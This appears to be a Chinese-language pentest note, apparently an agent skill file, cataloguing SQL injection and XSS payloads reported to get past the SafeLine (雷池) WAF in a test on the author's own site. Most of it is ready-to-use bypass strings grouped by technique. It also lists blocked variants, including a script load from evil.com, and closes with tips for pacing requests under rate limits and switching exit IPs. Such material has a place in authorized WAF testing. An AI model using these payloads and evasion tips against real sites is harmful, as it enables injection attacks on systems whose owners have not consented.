# SafeLine (雷池) WAF 实测穿透 payload 清单

> 来源：2026-08-11 对 xycovo.com（自家资产，SafeLine 雷池 latest docker 镜像）授权测试。
> 验证方式：穿透 payload 均出现在后端 nginx access.log（200 39915）＝ WAF 真实放行到达源站。
> 测试脚本：本机 Temp/xycovo-waf/（waf_bypass_matrix.py / waf_bypass_round2.py / waf_path_fixed.py / waf_protocol.py）+ Kali /tmp/。

## SQLi 参数层穿透（49 个，分类汇总）

### 注释截断类（-- - / # 变体）
```
1' AND-- -'1
1' AND# '1='1
1' AND#
1' AND%23'1
1' AND--+
1' AND--%20'1
1' AND-- '1
1' AND--'1
1' AND--%0a
1' ORDER BY 1-- -
1' AND 1=1-- -'1
1'#
1'%23
```

### || 拼接类（MySQL OR 等价）
```
1'||'1
1'||1
'||'1
1'||'1'='1
1'||(1)
1'||1=1
1'||'a'='a
1'||'a
1'||'1'||'1
1' OR '1'||'1
1'/**/||/**/'1
1'||'1'-- -
1' AND-- -'1'||'1
```

### MySQL 反引号类
```
1` OR `1`=`1
1`||`1
1` OR `1` LIKE `1
1` OR 1=1-- -
1` OR 1=1-- -'1
```

### 全角/Unicode 类
```
1' OR １=１-- -
1' OR １＝１-- -
1%EF%BC%87 OR 1=1-- -
1%EF%BC%87 OR %EF%BC%91=%EF%BC%91-- -
1' OR ①=①-- -
1' OR ⑴=⑴-- -
```

### 注释/空白拆分关键字类（最危险）
```
1' AN/**/D '1'='1
1' A/**/ND '1'='1
1' AN%0aD '1'='1
1' AN%09D '1'='1
1' AN%0bD '1'='1
1' UN/**/ION SE/**/LECT 1,2,3-- -
1' UN%0aION SE%0aLECT 1,2,3-- -
```

### 双重编码类
```
1%2527%257C%257C%25271
1%2527%2520OR%25201%253D1--%2520-
1%2527%2520AND%2520%25271%2527%253D%25271
```

### 未穿透（被拦）的参考类别
- 大小写 `AnD` / `UnIoN SeLeCt` — 拦
- `/**/` 完整注释替换空格（`1'/**/AND/**/'1'='1`）— 拦（只有拆进关键字中间才绕）
- `/*!50000*/` 版本注释 — 拦
- 数学等价 `1=1.0` / `1=01` / `1=1e0` — 拦
- 宽字节 `%bf%27` / `%df%27` — 拦
- `sleep()` / `benchmark()` / `pg_sleep()` — 拦
- hex `0x31` — 拦
- `OR 1 IN (1)` / `BETWEEN` / `LIKE` / `RLIKE` — 拦

## XSS 参数层穿透（25 个，分类汇总）

### 双写标签类
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr<script>ipt>alert`1`</scr</script>ipt>
<scr<script>ipt>${alert(1)}</scr</script>ipt>
```

### 反引号函数调用类（alert 裸词不拦！）
```
alert`1`
prompt`1`
confirm`1`
print`1`
alert`document.domain`
<svg/onload=alert`1`>
<img src=x onerror=alert`1`>
```

### 模板字面量类
```
${alert(1)}
${prompt(1)}
${alert`1`}
${alert(document.domain)}
<svg/onload=${alert(1)}>
```

### 注释/空白混淆类
```
<svg/onload=alert//(1)>
<svg/onload=alert%0a(1)>
<svg/onload=alert%09(1)>
<svg/onload=alert%0d(1)>
<svg/onload=alert\(1)>
<img src=x onerror=alert%0a(1)>
<img src=x onerror=alert (1)>
```

### 未穿透（被拦）的参考类别
- `<script>alert(1)</script>` 及大小写变体 — 拦
- `<svg/onload=alert(1)>` 标准形态 — 拦（插注释/空白/反引号才绕）
- `<img src=x onerror=alert(1)>` 标准形态 — 拦
- HTML 实体 `&#60;` / `&#x3c;` — 拦
- 双重 URL 编码 `%253C` — 拦
- `eval()` / `new Function()` / `setTimeout()` — 拦
- `javascript:` 协议（a/iframe/form/object/embed）— 拦
- 外链 `<script src=//evil.com>` — 拦

## 路径层结果（0 真穿透）

34 个变体测试（payload 在 URI 路径）：
- `.git` 变体：大小写 `.Git`/`.GIT`、`/.git//config`、`/./.git/config`、`/.%67it`、`/%2e%67%69%74`、`%00`、`;`、`;jsessionid`、`//` 前缀、`/a/../` 前置、`#`、`%20`、`..`、尾斜杠、`%2e`、`%252e%252e` 双重编码、`%2f` 编码、反斜杠 `%5c` — **全部 403 BLOCKED**
- 目录遍历：`....//`、`..;`、`%2e%2e%2f`、`%c0%ae%c0%ae`（overlong）、`%ef%bc%8e`（全角点）、`posts/../..` — **全部 403 BLOCKED**
- 唯一 200：`/.git/..` — nginx 路径规范化折叠成 `/` 返回首页，**假穿透**
- 部分 400/404：`%00` 路径（400）、编码后不存在路径（404）— origin nginx 层拒绝，非 WAF 放行

## 协议层结果（0 绕过）

| 测试 | 结果 |
|---|---|
| X-Forwarded-For / X-Real-IP / True-Client-IP / CF-Connecting-IP / X-Originating-IP / X-Client-IP / Forwarded / X-Forwarded-Host（12 种，127.0.0.1/localhost/服务器IP 值）| 全 BLOCKED |
| UA：curl / python-requests / Googlebot / Baiduspider / iPhone Safari / sqlmap | 全 BLOCKED |
| POST JSON body（SQLi/XSS 在 JSON 里）| BLOCKED（雷池解析 JSON）|
| POST form-urlencoded | BLOCKED |
| Chunked Transfer-Encoding（手动拼 chunk）| BLOCKED（重组检测）|
| 超长 payload 2KB-16KB | BLOCKED |
| 超长 payload 32KB/64KB | 连接被断/超时（拒绝，非放行）|

## 测试脚本要点（复现用）

- 分类逻辑：`BLOCKED` = HTTP 403 且 body 含 `event_id`；`PASSED` = 200 且 body 含首页特征串（`overflow-y-scroll scroll-smooth`）；400/404 = origin 拒绝
- **路径测试必须拼进 URI 路径**：`TARGET + "/.git/config"`，绝不能 `?x=/.git/config`（假阳性根源）
- 穿透铁证：后端 `nginx access.log` grep 到请求 = WAF 真放行；被拦请求只出现在 WAF 层日志
- 速率纪律：每 payload 间隔 0.15-0.3s，防触发雷池频率限制；批量从 Kali 跑可换出口 IP
- 测试脚本：`scripts/waf_batch_probe.py`（本技能）
